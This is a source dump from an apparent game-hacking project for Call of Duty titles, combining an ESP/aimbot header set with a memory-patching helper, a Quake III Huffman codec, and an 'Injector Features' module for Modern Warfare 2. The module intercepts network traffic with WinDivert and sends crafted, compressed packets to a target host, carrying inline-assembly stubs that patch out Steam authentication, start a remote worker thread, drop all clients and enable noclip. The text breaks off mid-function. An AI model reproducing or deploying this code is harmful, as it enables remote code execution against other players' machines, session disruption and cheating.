#define	CONTENTS_SLIME				0x00000010
#define	CONTENTS_WATER				0x00000020
#define	CONTENTS_FOG				0x00000040
#define	CONTENTS_MISSILECLIP		0x00000080
#define CONTENTS_ITEM				0x00000100
#define CONTENTS_BULLETCLIP1		0x00000400
#define CONTENTS_COD2_3				0x00000800
#define CONTENTS_COD2_2				0x00001000
#define CONTENTS_COD2_4				0x00002000
#define CONTENTS_MOVER				0x00004000
#define	CONTENTS_AREAPORTAL			0x00008000
#define	CONTENTS_PLAYERCLIP			0x00010000
#define	CONTENTS_MONSTERCLIP		0x00020000
#define	CONTENTS_TELEPORTER			0x00040000
#define	CONTENTS_JUMPPAD			0x00080000
#define CONTENTS_CLUSTERPORTAL		0x00100000
#define CONTENTS_DONOTENTER			0x00200000
#define CONTENTS_DONOTENTER_LARGE	0x00400000
#define CONTENTS_COD2_1				0x00800000
#define	CONTENTS_ORIGIN				0x01000000	// removed before bsping an entity
#define	CONTENTS_BODY				0x02000000	// should never be on a brush, only in game
#define	CONTENTS_CORPSE				0x04000000
#define	CONTENTS_DETAIL				0x08000000	// brushes not used for the bsp					/* FOG? */

#define	CONTENTS_STRUCTURAL		0x10000000	// brushes used for the bsp
#define	CONTENTS_TRANSLUCENT	0x20000000	// don't consume surface fragments inside
#define	CONTENTS_TRIGGER		0x40000000
#define	CONTENTS_NODROP			0x80000000	// don't leave bodies or items (death fog, lava)

#define	MASK_ALL				(-1)
#define	MASK_SOLID				(CONTENTS_SOLID)
#define	MASK_PLAYERSOLID		(0x02810011)//(CONTENTS_SOLID|CONTENTS_PLAYERCLIP|CONTENTS_BODY)
#define	MASK_DEADSOLID			(CONTENTS_SOLID|CONTENTS_PLAYERCLIP)
#define	MASK_WATER				(CONTENTS_WATER|CONTENTS_LAVA|CONTENTS_SLIME)
#define	MASK_OPAQUE				(CONTENTS_SOLID|CONTENTS_SLIME|CONTENTS_LAVA)
#define	MASK_SHOT				(0x02802091)//(CONTENTS_SOLID|CONTENTS_BODY|CONTENTS_CORPSE)

#define MASK_TARGET				(CONTENTS_SOLID|CONTENTS_BODY|CONTENTS_SLIME|CONTENTS_BULLETCLIP1)/*0x02802411*/

float GetDistance( vec3_t origin );
bool IsVisible( vec3_t point );
void GetAngleToOrigin( vec3_t origin, vec3_t angles );
```

`Esp & Aim/memhack.h`:

```h
#pragma once

static void MemoryWrite( void *adr, void *ptr, int size )
{
    DWORD OldProtection;
    VirtualProtect( adr, size, PAGE_EXECUTE_READWRITE, &OldProtection );
    memcpy( adr, ptr, size );
    VirtualProtect( adr, size, OldProtection, &OldProtection );
}
```

`Esp & Aim/stdafx.h`:

```h
#pragma once

#include <Windows.h>
#include <string>
#include <vector>
#include <algorithm>
#include <detours.h>
```

`Esp & Aim/types.h`:

```h
#pragma once

#define KEY_DOWN(vk_code) ((GetAsyncKeyState(vk_code) & 0x8000) ? 1 : 0)

typedef struct
{
    centity_t *	    cent;
    refEntity_t *   ent;
    shaderInfo_t *  si;
    bool			visible;
    int				fov_x;
    int				fov_y;
    float			distance;
    vec3_t			aimangles;
} BotTarget_t;

typedef struct
{
    refEntity_t ent;
    shaderInfo_t si;
    centity_t cent;
} model_t;

typedef struct
{
    DWORD gfx_dll;
    float *viewangles;
    cg_t *cg;
    input_t *input;
    bool Aimkeypress;
    bool Shoot;
} set_t;

extern set_t set;
extern cg_t * cg;
extern float * viewangles;
```

`Injector Features/Extern/Huffman.cpp`:

```cpp
/*
===========================================================================
Copyright (C) 1999-2005 Id Software, Inc.
This file is part of Quake III Arena source code.
Quake III Arena source code is free software; you can redistribute it
and/or modify it under the terms of the GNU General Public License as
published by the Free Software Foundation; either version 2 of the License,
or (at your option) any later version.
Quake III Arena source code is distributed in the hope that it will be
useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with Foobar; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
===========================================================================
*/

#include "STDInclude.hpp"
#include "Extern/Huffman.hpp"

/* This is based on the Adaptive Huffman algorithm described in Sayood's Data
* Compression book.  The ranks are not actually stored, but implicitly defined
* by the location of a node within a doubly-linked list */

static int bloc = 0;

/* Add a bit to the output file (buffered) */
static void add_bit(char bit, byte *fout) {
	if ((bloc & 7) == 0) {
		fout[(bloc >> 3)] = 0;
	}
	fout[(bloc >> 3)] |= bit << (bloc & 7);
	bloc++;
}

/* Receive one bit from the input file (buffered) */
static int get_bit(byte *fin) {
	int t;
	t = (fin[(bloc >> 3)] >> (bloc & 7)) & 0x1;
	bloc++;
	return t;
}

/* Get a symbol */

static void Huff_offsetReceive(node_t *node, int *ch, byte *fin, int *offset) {
	bloc = *offset;
	while (node && node->symbol == INTERNAL_NODE) {

		if (get_bit(fin)) {
			node = node->right;

		}
		else {
			node = node->left;

		}
	}
	if (!node) {
		*ch = 0;
		//		Com_PrintError("Illegal tree!\n");
		return;

	}
	*ch = node->symbol;
	*offset = bloc;
}



/* Send the prefix code for this node */
static void Huff_send(node_t *node, node_t *child, byte *fout) {
	if (node->parent) {
		Huff_send(node->parent, node, fout);
	}
	if (child) {
		if (node->right == child) {
			add_bit(1, fout);
		}
		else {
			add_bit(0, fout);
		}
	}
}

static void Huff_offsetTransmit(huff_t *huff, int ch, byte *fout, int *offset) {
	bloc = *offset;
	Huff_send(huff->loc[ch], NULL, fout);
	*offset = bloc;
}


static void Huff_Init(huff_t *huff) {

	Com_Memset(huff, 0, sizeof(huff_t));

	// Initialize the tree & list with the NYT node
	huff->tree = &(huff->nodeList[huff->blocNode++]);
	huff->loc[NYT] = huff->tree;

	huff->tree->symbol = NYT;

	huff->tree->weight = 0;
	huff->tree->parent = NULL;
	huff->tree->left = NULL;
	huff->tree->right = NULL;
}



int _msg_hData[256] = {
	0x384E8,
	0x7A5A,
	0x5068,
	0x60CA,
	0x4F54,
	0x4203,
	0x49ED,
	0x3191,
	0x2ECD,
	0x1E95,
	0x1D04,
	0x1062,
	0x1CAE,
	0x17B1,
	0x16D3,
	0x1699,
	0x2471,
	0x161A,
	0x15C3,
	0x1058,
	0x18E3,
	0x1668,
	0x0F7B,
	0x0E24,
	0x15DC,
	0x10C5,
	0x0EEE,
	0x0D2D,
	0x1163,
	0x18F3,
	0x0E82,
	0x11E1,
	0x647F,
	0x109F,
	0x1B2B,
	0x0A23,
	0x13D3,
	0x0E67,
	0x0DE5,
	0x0B20,
	0x17CA,
	0x0DE7,
	0x0DCE,
	0x0D52,
	0x0DF8,
	0x0CD5,
	0x0C24,
	0x0AFA,
	0x40D8,
	0x23BE,
	0x2330,
	0x1374,
	0x18D2,
	0x15E1,
	0x1576,
	0x0FF8,
	0x1474,
	0x117E,
	0x0C14,
	0x86C,
	0x0B6E,
	0x0AAD,
	0x0BC6,
	0x16E5,
	0x45FE,
	0x1331,
	0x1777,
	0x12A3,
	0x16E3,
	0x1AE6,
	0x0A6C,
	0x0C21,
	0x151A,
	0x0F03,
	0x0F02,
	0x0E8F,
	0x14C1,
	0x0B68,
	0x0D91,
	0x0CFF,
	0x1C6A,
	0x0B74,
	0x0ECC,
	0x0B5B,
	0x0DB4,
	0x0B95,
	0x0B70,
	0x0A69,
	0x110D,
	0x0AA9,
	0x1218,
	0x97B,
	0x0AAE,
	0x75E,
	0x6DF,
	0x1219,
	0x1A22,
	0x1D65,
	0x0FA1,
	0x0DE8,
	0x1A68,
	0x11D0,
	0x1026,
	0x0A15,
	0x0E62,
	0x0D82,
	0x0A2B,
	0x824,
	0x13B5,
	0x0B3C,
	0x0B2E,
	0x9C1,
	0x2AA7,
	0x22C6,
	0x1027,
	0x0C8A,
	0x1003,
	0x0B1B,
	0x0A52,
	0x8CE,
	0x0D11,
	0x9D1,
	0x0ADC,
	0x773,
	0x0C66,
	0x0A24,
	0x9E4,
	0x1686,
	0x5E95,
	0x1B67,
	0x138B,
	0x189E,
	0x0F58,
	0x0DFA,
	0x0D3F,
	0x1936,
	0x13D2,
	0x0BDB,
	0x0BF6,
	0x0A32,
	0x0C36,
	0x841,
	0x9E2,
	0x0B3D,
	0x1602,
	0x0C22,
	0x0D7F,
	0x0AF7,
	0x12C6,
	0x914,
	0x9CE,
	0x98C,
	0x0EA7,
	0x0C4E,
	0x848,
	0x77A,
	0x981,
	0x716,
	0x893,
	0x0D28,
	0x20AA,
	0x9A1,
	0x0A23,
	0x850,
	0x0CFF,
	0x0AA3,
	0x0A7D,
	0x976,
	0x0EBC,
	0x853,
	0x8ED,
	0x943,
	0x0D56,
	0x8D9,
	0x8EE,
	0x877,
	0x15F1,
	0x0A8C,
	0x0AEE,
	0x731,
	0x8CF,
	0x679,
	0x0AFC,
	0x52B,
	0x0ADB,
	0x6B7,
	0x784,
	0x62F,
	0x963,
	0x681,
	0x93B,
	0x0B9B,
	0x251F,
	0x1467,
	0x0E03,
	0x0EF2,
	0x1053,
	0x0D55,
	0x0D69,
	0x0BDE,
	0x1140,
	0x924,
	0x930,
	0x721,
	0x0A91,
	0x669,
	0x7B4,
	0x89F,
	0x0F91,
	0x7B9,
	0x0A2D,
	0x8E7,
	0x0C56,
	0x76E,
	0x81D,
	0x5E9,
	0x12A2,
	0x7BC,
	0x6F4,
	0x68C,
	0x77E,
	0x78F,
	0x900,
	0x8AB,
	0x1579,
	0x8AD,
	0x0A9B,
	0x8AA,
	0x0BA8,
	0x88B,
	0x7EF,
	0x9BB,
	0x10E9,
	0x0B61,
	0x0AB6,
	0x0A09,
	0x0C6B,
	0x81D,
	0x7DE,
	0x9A2,
	0x0F5D,
	0x9AC,
	0x941,
	0x7D4,
	0x0C80,
	0x999,
	0x0ADD,
	0x97F,
	0x13FC,
	0x97F,
	0x0CFC,
	0x0B30,
	0x11C2,
	0x0E4B,
	0x1592,
	0x753D
};

static huff_t		msgHuff;

int MSG_ReadBitsCompress(const byte* input, int readsize, byte* outputBuf, int outputBufSize) {

	readsize = readsize * 8;
	byte *outptr = outputBuf;

	int get;
	int offset;
	int i;

	if (readsize <= 0) {
		return 0;
	}

	for (offset = 0, i = 0; offset < readsize && i < outputBufSize; i++) {
		Huff_offsetReceive(msgHuff.tree, &get, (byte*)input, &offset);
		*outptr = (byte)get;
		outptr++;
	}
	return i;
}

int MSG_WriteBitsCompress(char /*dummy*/, const byte *datasrc, byte *buffdest, int bytecount) {

	int offset;
	int i;

	if (bytecount <= 0) {
		return 0;
	}

	for (offset = 0, i = 0; i < bytecount; i++) {
		Huff_offsetTransmit(&msgHuff, (int)datasrc[i], buffdest, &offset);
	}
	return (offset + 7) / 8;
}

int __cdecl nodeCmp(const void *left, const void *right)
{
	return reinterpret_cast<const nodetype*>(left)->left->weight - reinterpret_cast<const nodetype*>(right)->left->weight;
}

static void Huff_BuildFromData(huff_t* huff, const int* msg_hData)
{
	static_assert(sizeof(intptr_t) == 4, "64bit support not yet given!");

	huff_t *v2; // esi
	signed int v3; // edx
	const int *v4; // eax
	int v5; // ebx
	int v6; // ecx
	int v7; // ecx
	int v8; // ebx
	nodetype *v9; // ecx
	int v10; // ebx
	int v11; // ecx
	int v12; // ebx
	int v13; // ecx
	int v14; // ecx
	int v15; // ebx
	nodetype *v16; // ecx
	int v17; // ebx
	nodetype *v18; // eax
	nodetype *v19; // ecx
	nodetype **v20; // ebx
	nodetype *v21; // eax
	nodetype *v22; // ecx
	int v23; // ecx
	bool v24; // zf
	nodetype *heap[256]; // [esp+Ch] [ebp-420h]
	int v26; // [esp+40Ch] [ebp-20h]
	int v27; // [esp+410h] [ebp-1Ch]
	int v28; // [esp+414h] [ebp-18h]
	int v29; // [esp+418h] [ebp-14h]
	int v30; // [esp+41Ch] [ebp-10h]
	int v31; // [esp+420h] [ebp-Ch]
	int heapHead; // [esp+424h] [ebp-8h]
	nodetype **v33; // [esp+428h] [ebp-4h]
	int symbola; // [esp+434h] [ebp+8h]
	int symbolb; // [esp+434h] [ebp+8h]
	int symbolc; // [esp+434h] [ebp+8h]
	int symbold; // [esp+434h] [ebp+8h]
	int symbol; // [esp+434h] [ebp+8h]

	v26 = 8 - (_DWORD)msg_hData;
	v31 = 12 - (_DWORD)msg_hData;
	v30 = (char *)heap - (char *)msg_hData;
	v28 = 4 - (_DWORD)msg_hData;
	v29 = 16 - (_DWORD)msg_hData;
	v33 = &heap[1];
	v27 = (char *)&heap[1] - (char *)msg_hData;
	v2 = huff;
	heapHead = 0;
	v3 = 2;
	v4 = msg_hData + 2;
	do
	{
		v5 = v2->blocNode;
		symbola = *(v4 - 2);
		v6 = v2->blocNode++;
		v2->nodeList[v6].left = 0;
		v2->nodeList[v6].right = 0;
		v2->nodeList[v6].parent = 0;
		v7 = (int)&v2->nodeList[v5];
		*(_DWORD *)(v7 + 16) = v3 - 2;
		*(_DWORD *)(v7 + 12) = symbola;
		*(int *)((char *)&v2->blocNode + (_DWORD)v4 + v28) = v7;
		*(v33 - 1) = (nodetype *)v7;
		v8 = v2->blocNode;
		symbolb = *(v4 - 1);
		++v2->blocNode;
		v9 = &v2->nodeList[v8];
		v9->symbol = v3 - 1;
		v9->weight = symbolb;
		v10 = v26;
		v9->left = 0;
		v9->right = 0;
		v9->parent = 0;
		*(int *)((char *)&v2->blocNode + (_DWORD)v4 + v10) = (int)v9;
		*v33 = v9;
		symbolc = *v4;
		v11 = v2->blocNode++;
		v2->nodeList[v11].symbol = v3;
		v2->nodeList[v11].weight = symbolc;
		v12 = v31;
		v2->nodeList[v11].left = 0;
		v13 = (int)&v2->nodeList[v11];
		*(_DWORD *)(v13 + 4) = 0;
		*(_DWORD *)(v13 + 8) = 0;
		*(int *)((char *)&v2->blocNode + (_DWORD)v4 + v12) = v13;
		*(int *)((char *)v4 + v30) = v13;
		v14 = v4[1];
		v15 = v2->blocNode;
		v33 += 4;
		symbold = v14;
		v2->blocNode = v15 + 1;
		v16 = &v2->nodeList[v15];
		v16->symbol = v3 + 1;
		v16->weight = symbold;
		v17 = v29;
		v16->left = 0;
		v16->right = 0;
		v16->parent = 0;
		*(int *)((char *)&v2->blocNode + (_DWORD)v4 + v17) = (int)v16;
		v3 += 4;
		*(int *)((char *)v4 + v27) = (const int)v16;
		v4 += 4;
	} while (v3 - 2 < 256);
	qsort(heap, 0x100u, 4u, nodeCmp);
	v18 = &v2->nodeList[v2->blocNode++];
	v18->right = 0;
	v18->left = 0;
	v18->weight = 1;
	v18->symbol = 257;
	v18->parent = 0;
	v2->freelist = &v18->left;
	v19 = v2->tree;
	v18->left = v19;
	v18->right = heap[0];
	v19->parent = v18;
	v18->right->parent = v18;
	v20 = heap;
	v18->weight = v18->right->weight + v18->left->weight;
	heap[0] = v18;
	symbol = 0;
	v33 = (nodetype **)255;
	do
	{
		qsort(v20, 256 - heapHead, 4u, nodeCmp);
		v21 = &v2->nodeList[v2->blocNode++];
		v21->left = 0;
		v21->right = 0;
		v21->symbol = 257;
		v21->parent = 0;
		v21->weight = 1;
		v22 = *v20;
		v2->freelist = &v21->left;
		v21->left = v22;
		v21->right = *(nodetype **)((char *)&heap[1] + symbol);
		v21->left->parent = v21;
		v21->right->parent = v21;
		v21->weight = v21->right->weight + v21->left->weight;
		v23 = heapHead + 1;
		heapHead = v23;
		v23 *= 4;
		v24 = v33 == (nodetype **)1;
		v33 = (nodetype **)((char *)v33 - 1);
		v20 = (nodetype **)((char *)heap + v23);
		symbol = v23;
		*(nodetype **)((char *)heap + v23) = v21;
	} while (!v24);
	v2->tree = heap[heapHead];
}

void Huffman_InitMain() {

	static qboolean huffInit = false;

	if (huffInit)
		return;

	huffInit = true;
	Huff_Init(&msgHuff);
	Huff_BuildFromData(&msgHuff, _msg_hData);
}
```

`Injector Features/Extern/Huffman.hpp`:

```hpp
/*
===========================================================================
Copyright (C) 1999-2005 Id Software, Inc.
This file is part of Quake III Arena source code.
Quake III Arena source code is free software; you can redistribute it
and/or modify it under the terms of the GNU General Public License as
published by the Free Software Foundation; either version 2 of the License,
or (at your option) any later version.
Quake III Arena source code is distributed in the hope that it will be
useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with Foobar; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
===========================================================================
*/

#pragma once

typedef unsigned char byte;
typedef DWORD _DWORD;
typedef bool qboolean;

#define NYT HMAX                    /* NYT = Not Yet Transmitted */
#define INTERNAL_NODE ( HMAX + 1 )

typedef struct nodetype {
	struct  nodetype *left, *right, *parent; /* tree structure */
											 //	struct  nodetype *next, *prev; /* doubly-linked list */
											 //	struct  nodetype **head; /* highest ranked node in block */
	int weight;
	int symbol; //0x10
				//	struct  nodetype *next, *prev; /* doubly-linked list */
				//	struct  nodetype **head; /* highest ranked node in block */

} node_t; //Length: 20

#define HMAX 256 /* Maximum symbol */

typedef struct {
	int         blocNode;
	int         blocPtrs;

	node_t*     tree;
	node_t*     loc[HMAX + 1];
	node_t**    freelist;

	node_t      nodeList[768];
	node_t*     nodePtrs[768];

} huff_t;
/* size 19476*/

int MSG_ReadBitsCompress(const byte* input, int readsize, byte* outputBuf, int outputBufsize);
int MSG_WriteBitsCompress(char dummy, const byte *datasrc, byte *buffdest, int bytecount);
void Huffman_InitMain();

#define Com_Memcpy memcpy
#define Com_Memset memset

```

`Injector Features/Game/MW2/Client.cpp`:

```cpp
#include "STDInclude.hpp"

#include "Network/Address.hpp"
#include "Network/Sniffer.hpp"

#include "Game/MW2/Handler.hpp"
#include "Game/MW2/Client.hpp"

#include "Game/MW2/Exploit.hpp"

#include "Extern/Huffman.hpp"

namespace Game
{
	namespace MW2
	{
		Client::Client(Handler* _handler, Network::Address _target) : handler(_handler), target(_target), id(0), ack(0), workerInstalled(false)
		{
			ZeroMemory(this->commands, sizeof(this->commands));

			this->onOOB("challengeResponse", [this](Network::Packet* /*packet*/, std::string data, bool receiving)
			{
				if (!receiving) return;
				while (!data.empty() && data.back() == 0) data.pop_back();

				this->challenge = strtoul(data.data(), nullptr, 10);
			});

			this->onOOB("statResponse", [this](Network::Packet* /*packet*/, std::string data, bool receiving)
			{
				if (!receiving) return;
				while (!data.empty() && data.back() == 0) data.pop_back();

				if (atoi(data.data()) == 0 && !this->workerInstalled)
				{
					this->workerInstalled = true;

					//printf("Installing worker thread...\n");
					//this->sendPayload(packet->sniffer, -1);
				}
			});

			this->onOOB("connect", [this](Network::Packet* /*packet*/, std::string data, bool receiving)
			{
				static std::regex infoStringRegex("([0-9a-fA-F]+) \"(.+)\"");

				if (!receiving)
				{
					std::smatch match;
					if (std::regex_search(data, match, infoStringRegex) && match.size() >= 3)
					{
						Utils::InfoString info(match[2]);
						this->qport = USHORT(atoi(info.get("qport").data()));
						this->xuid = strtoull(info.get("xuid").data(), nullptr, 16);

#ifdef DEBUG
						printf("Connecting to party at %s with xuid %llX as %s\n", this->target.toString().data(), this->xuid, info.get("name").data());
#else
						printf("Connecting to party with xuid %llX as %s\n", this->xuid, info.get("name").data());
#endif
					}
				}
			});

			this->onOOB("connectResponse", [this](Network::Packet* /*packet*/, std::string /*data*/, bool receiving)
			{
				if (receiving)
				{
					printf("Connected to server!\n");
					/*MessageBoxA(0, 0, 0, 0);
					this->send(sniffer, networkIf, "\xFF\xFF\xFF\xFF" "relay 1234567890");*/
				}
			});
		}

		Client::~Client()
		{

		}

		std::string Client::compressData(std::string data)
		{
			Huffman_InitMain();

			Utils::Memory::Allocator allocator;
			u_char* buffer = allocator.allocateArray<u_char>(0x10000 + data.size() * 2);
			int size = MSG_WriteBitsCompress(0, reinterpret_cast<const u_char*>(data.data()), buffer, data.size());

			return std::string(LPSTR(buffer), size);
		}

		void Client::sendPayload(Network::Sniffer* sniffer, int num)
		{
			Utils::Buffer buffer;

#ifdef USE_IW4X
			buffer.write<int>(-2);
#endif

			buffer.write<int>(this->id + 1);
			buffer.write<short>(this->qport); // qport

			buffer.write<char>(0);
			buffer.write<int>(0);

			//int command = this->ack & ~(MAX_RELIABLE_COMMANDS - 1);
			int command = this->ack + (MAX_RELIABLE_COMMANDS - 1);

			command &= ~(MAX_RELIABLE_COMMANDS - 1); // Resolve to slot 0
			buffer.write<int>(command); // Reliable ack

			Exploit exploit;
			std::string data = this->compressData(exploit.buildPayload(num));

			//int i = 0, index = 0;
			u_char key = u_char(this->challenge);
			//u_char* string = this->commands[command & (MAX_RELIABLE_COMMANDS - 1)]; // Unnecessary, we won't decrypt server data

			for (auto& chr : data)
			{
				/*if (!string[index]) index = 0;
				if (string[index] > 127 || string[index] == '%')
				{
					key ^= '.' << (i & 1);
				}
				else
				{
					key ^= string[index] << (i & 1);
				}

				++index, ++i;*/

				chr ^= key;
			}

			buffer.append(data);

			if (num == 7)
			{
				buffer.clear();
				buffer.write(-15);
				buffer.write(0);
			}

			this->send(sniffer, buffer);

#ifdef DEBUG
			printf("Sending bytes %s\n", Utils::String::DumpHex(buffer, " ").data());
#endif
		}

		void Client::onOOB(std::string command, Callback callback)
		{
			this->oobHandlers[Utils::String(command).toLower()] = callback;
		}

		void Client::send(Network::Sniffer* sniffer, std::string data)
		{
			if (this->packetTemplate.staticData.empty()) return;

			Utils::Buffer buffer(this->packetTemplate.staticData);
			PBYTE buf = PBYTE(buffer.data());

			PWINDIVERT_IPHDR ipHeader = PWINDIVERT_IPHDR(buf);
			u_short ipHeaderLength = ipHeader->HdrLength * 4;
			ipHeader->Length = htons(u_short(ipHeaderLength + sizeof(WINDIVERT_UDPHDR) + data.size()));

			PWINDIVERT_UDPHDR udpHeader = PWINDIVERT_UDPHDR(buf + (ipHeader->HdrLength * 4));
			udpHeader->Length = htons(u_short(data.size() + sizeof(WINDIVERT_UDPHDR)));

			IN_ADDR source, dest;
			dest.S_un.S_addr = ipHeader->DstAddr;
			source.S_un.S_addr = ipHeader->SrcAddr;

			udpHeader->Checksum = 0;

			buffer.append(data);

			Network::Packet outPacket;
			outPacket.address = this->packetTemplate.address;
			outPacket.rawData = std::string_view(buffer.data(), buffer.size());

			sniffer->send(&outPacket);
		}

		int Client::getDirection(Network::Address source, Network::Address _target)
		{
			if (source == this->target) return Client::PacketDirection::REMOTE_TO_LOCAL;
			if (_target == this->target) return Client::PacketDirection::LOCAL_TO_REMOTE;

			return Client::PacketDirection::NONE;
		}

		void Client::handle(Network::Packet* packet, bool receiving)
		{
			if (!receiving && this->packetTemplate.staticData.empty())
			{
				this->packetTemplate = *packet;
				this->packetTemplate.staticData = packet->rawData.substr(0, packet->rawData.size() - packet->data.size());
			}

			if (!this->handleOOB(packet, receiving))
			{
				this->handleNetchan(packet, receiving);
			}
		}

		bool Client::handleOOB(Network::Packet* packet, bool receiving)
		{
			if (packet->data.size() >= 4 && !std::memcmp(packet->data.data(), "\xFF\xFF\xFF\xFF", 4))
			{
				Utils::String command;
				for (auto i = packet->data.begin() + 4; i != packet->data.end(); ++i)
				{
					if (*i == '\0' || *i == '\n' || *i == ' ' || (i + 1) == packet->data.end())
					{
						command = std::string(packet->data.begin() + 4, i);
						break;
					}
				}

				std::string buffer;
				if (packet->data.size() >= command.size() + 5)
				{
					buffer = std::string(packet->data.begin() + command.size() + 5, packet->data.end());
				}

				auto callback = this->oobHandlers.find(command.toLower());
				if (callback != this->oobHandlers.end())
				{
					callback->second(packet, buffer, receiving);
				}

				return true;
			}

			return false;
		}

		void Client::handleNetchan(Network::Packet* packet, bool receiving)
		{
			if (!receiving)
			{
				if (packet->data.size() >= 4)
				{
					size_t offset = 0;
#ifdef USE_IW4X
					offset = 4;
#endif

					this->id = *PINT(packet->data.data() + offset);
					this->ack = *PINT(packet->data.data() + offset + 7);
				}
			}
		}
	}
}

```

`Injector Features/Game/MW2/Client.hpp`:

```hpp
#pragma once

#define MAX_RELIABLE_COMMANDS 128
#define MAX_STRING_CHARS 1024

namespace Game
{
	namespace MW2
	{
		class Client
		{
		public:
			enum PacketDirection
			{
				NONE = 0,
				LOCAL_TO_REMOTE,
				REMOTE_TO_LOCAL
			};

			Client(Handler* handler, Network::Address target);
			~Client();

			int getDirection(Network::Address source, Network::Address target);
			void handle(Network::Packet* packet, bool receiving);

			void sendPayload(Network::Sniffer* sniffer, int num);

		private:
			typedef Utils::Slot<void(Network::Packet* packet, std::string data, bool receiving)> Callback;

			Handler* handler;
			Network::Address target;
			Network::Packet packetTemplate;

			bool workerInstalled;

			u_int64 xuid;
			u_short qport;
			u_int challenge;

			u_int id; // Packet id
			u_int ack; // Reliable command

			u_char commands[MAX_RELIABLE_COMMANDS][MAX_STRING_CHARS];

			std::map<std::string, Callback> oobHandlers;

			bool handleOOB(Network::Packet* packet, bool receiving);
			void handleNetchan(Network::Packet* packet, bool receiving);

			void onOOB(std::string command, Callback callback);
			void send(Network::Sniffer* sniffer, std::string data);

			std::string compressData(std::string data);
		};
	}
}

```

`Injector Features/Game/MW2/Exploit.cpp`:

```cpp
#include "STDInclude.hpp"

#include "Game/MW2/Exploit.hpp"

#ifdef USE_IW4X

#define UNUSED_MEMORY_POINTER 0x64A3050
#define UNUSED_DATA_POINTER 0x64A3071
#define RESTORE_SERVER_CONTEXT 0x4B2412

#define ORG_PARAM 0x31D9390

#else

#define UNUSED_MEMORY_POINTER 0x642D718
#define UNUSED_DATA_POINTER 0x642D964
#define UNUSED_DATA_POINTER2 0x642D848
#define RESTORE_SERVER_CONTEXT 0x56A092

#define ORG_PARAM 0x3172010

#define WORKER_POINTER_ADDR 0x642D950

#endif

namespace Game
{
	namespace MW2
	{
#pragma optimize("", off)
		__declspec(naked) void Exploit::HudElementStub()
		{
			__asm
			{
				push 0
				push 2047

				mov eax, 5293E0h // HudElem_Alloc
				call eax

				pop ebx
				pop ebx

				mov dword ptr[eax], 1 // type (text)
				mov dword ptr[eax + 20], 40000000h //3F800000h // font scale (1.0f)
				mov dword ptr[eax + 52], 0FF000000h // color
				//mov dword ptr[eax + 56], 0FF00FF00h // from color
				mov dword ptr[eax + 140], 07FFFFF00h // glow color

				xor ecx, ecx
				mov dword ptr[eax + 72], ecx
				mov dword ptr[eax + 68], ecx
				mov dword ptr[eax + 80], ecx
				mov dword ptr[eax + 76], ecx
				mov dword ptr[eax + 88], ecx
				mov dword ptr[eax + 84], ecx
				mov dword ptr[eax + 92], ecx
				mov dword ptr[eax + 108], ecx
				mov dword ptr[eax + 104], ecx
				mov dword ptr[eax + 116], ecx
				mov dword ptr[eax + 112], ecx
				mov dword ptr[eax + 124], ecx
				mov dword ptr[eax + 120], ecx
				mov dword ptr[eax + 132], ecx
				mov dword ptr[eax + 128], ecx

				// Typewriter effect
				/*mov ecx, ds:1B4B884h // Get level time

				mov dword ptr[eax + 144], ecx
				mov dword ptr[eax + 148], 100    // letter speed
				mov dword ptr[eax + 152], 120000 // decay delay - 2 minutes
				mov dword ptr[eax + 156], 600    // decay speed*/

				// Fade color
				//mov[eax + 56], ecx // Start time
				//mov[eax + 60], edx // Duration

				push eax
				push [esp + 8h]

				mov eax, 54D490h // G_LocalizedStringIndex
				call eax

				pop ebx
				pop ebx

				mov [ebx + 132], eax
				or byte ptr[ebx + 164], 1

				retn

				// Endmarker
				nop
				nop
				nop
				nop
			}
		}

		__declspec(naked) void Exploit::EnableSteamAuthExploitStub()
		{
			__asm
			{
				push 6ADE14h // kernel32.dll
				call ds:67D1FCh // GetModuleHandleA

				push UNUSED_DATA_POINTER
				push eax
				call ds:67D210h // GetProcAddress

				push UNUSED_DATA_POINTER
				push PAGE_EXECUTE_READWRITE
				push 2
				push 58587Ch // Steam auth patched jump

				call eax

				mov ebx, 58587Ch
				mov word ptr[ebx], 9090h // Nop the jump

				retn
			}
		}

#ifndef USE_IW4X
		__declspec(naked) void Exploit::ExploitWorkerStub()
		{
			const static int sockaddrLen = sizeof(sockaddr_in);

			__asm
			{
				// int __stdcall recvfrom(SOCKET s, char *buf, int len, int flags, struct sockaddr *from, int *fromlen)
				push UNUSED_MEMORY_POINTER
				mov eax, [esp]
				mov ebx, sockaddrLen
				mov [eax], ebx
				push UNUSED_DATA_POINTER
				push MSG_PEEK
				push 100h
				push UNUSED_DATA_POINTER2
				push ds:642D6D0h

				call ds:67D3E4h // recvfrom

				cmp eax, 0
				jl skipParse

				mov eax, UNUSED_DATA_POINTER
				cmp [eax], -15
				//jne skipParse

				push 3A98h
				call ds:67D1A0h // Sleep

				push 5898D0h // Drop all clients
				push 0
				mov eax, 563C50h
				call eax

				add esp, 8h

			skipParse:

				push 1h
				call ds:67D1A0h // Sleep

				mov eax, 4BCBF0h // CL_IsCGameInitialized
				call eax
				test al, al
				//jz terminateThread

				// Loop the thread
				mov eax, WORKER_POINTER_ADDR
				push [eax]
				retn

				// Terminate the thread
			//terminateThread:
				xor esi, esi
				mov eax, WORKER_POINTER_ADDR
				push [eax]
				push 42513Ch // Pop param
				push 5B7880h // Z_VirtualFreeInternal

				retn

				// Endmarker
				nop
				nop
				nop
				nop
			}
		}

		__declspec(naked) void Exploit::ExploitWorkerCaller()
		{
			__asm
			{
				push 1F4h
				call ds : 67D1A0h // Sleep

				push 0 // Id
				push 0 // Flags
				push 0 // Param

				mov eax, WORKER_POINTER_ADDR
				push [eax]

				push 0
				push 0

				call ds:67D1D0h // CreateThread

				retn

				// Endmarker
				nop
				nop
				nop
				nop
			}
		}

		__declspec(naked) void Exploit::EnableUfoModeStub()
		{
			__asm
			{
				mov eax, 194B950h // g_entities
				mov eax, [eax + 158h] // g_client
				or dword ptr[eax + 3394h], 2 // flags
				retn

				// Endmarker
				nop
				nop
				nop
				nop
			}
		}
#endif
#pragma optimize("", on)

		void Exploit::spawnHudElement(std::vector<DWORD>* stack, std::string text)
		{
